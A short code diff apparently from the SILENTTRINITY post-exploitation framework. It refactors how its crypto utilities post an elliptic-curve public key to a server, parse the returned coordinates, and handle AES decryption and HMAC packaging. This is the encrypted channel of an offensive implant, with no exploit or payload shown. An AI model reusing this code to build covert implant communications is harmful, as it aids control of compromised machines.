@@ -72,19 +72,17 @@ namespace SILENTTRINITY.Utilities.Crypto
                     publicKey.Q.AffineYCoord.ToBigInteger()
                 );
 
-            string response = Encoding.UTF8.GetString(Http.Post(url, Encoding.UTF8.GetBytes(json)));
-            response = response.Replace("\"", "'");
+            string response = Encoding.UTF8.GetString(Http.Post(url,
+                                 Encoding.UTF8.GetBytes(json))).Replace("\"", "'");
 
-            var mcx = new Regex(@"': (.+?) ").Matches(response);
-            BigInteger x = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", ""));
-
+            // Really ugly, but we're trying to reduce extra dependencies...
+            MatchCollection mcx = new Regex(@"': (.+?) ").Matches(response);
             string mcy = response.Substring(response.LastIndexOf(": ", 
                             StringComparison.Ordinal) + 1).Replace("}","").Trim();
-            BigInteger y = new BigInteger(mcy);
 
             return new KeyCoords { 
-                X = x,
-                Y = y
+                X = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", "")),
+                Y = new BigInteger(mcy)
             };
         }
 
@@ -112,6 +110,7 @@ namespace SILENTTRINITY.Utilities.Crypto
                 }
                 decryptedData = AES.Decrypt(ciphertext, key, iv);
             }
+
             return decryptedData;
         }
 
@@ -133,6 +132,7 @@ namespace SILENTTRINITY.Utilities.Crypto
                     blob = ivEncData.Concat(hmac);
                 }
             }
+
             return blob.ToArray();
         }
     }
